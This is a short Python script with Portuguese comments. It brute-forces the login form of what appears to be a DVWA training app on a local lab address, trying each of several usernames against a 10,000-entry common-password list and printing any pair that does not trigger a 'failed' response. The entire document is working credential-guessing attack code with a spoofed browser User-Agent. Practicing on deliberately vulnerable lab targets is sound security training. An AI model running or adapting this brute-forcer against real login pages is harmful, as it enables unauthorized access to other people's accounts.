import requests

headers = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
}

users = ["admin", "gordonb", "1337", "pablo", "smithy", "user"]
url = "http://192.168.56.6/dvwa/login.php"

with open("10k-most-common.txt") as f:
    conteudo = f.readlines()

for user in users:
    print("[+] Tentativa para usuario: " + user)
    with requests.Session() as session:
        session.get(url, headers=headers)  # obtém cookie inicial
        for c, linha in enumerate(conteudo):
            senha = linha.strip()
            data_dict = {"username": user, "password": senha, "Login": "Login"}
            response = session.post(url, data=data_dict, headers=headers)
            html = response.text
            if "failed" not in html:
                print("\t* " + user + "/" + senha)
                break

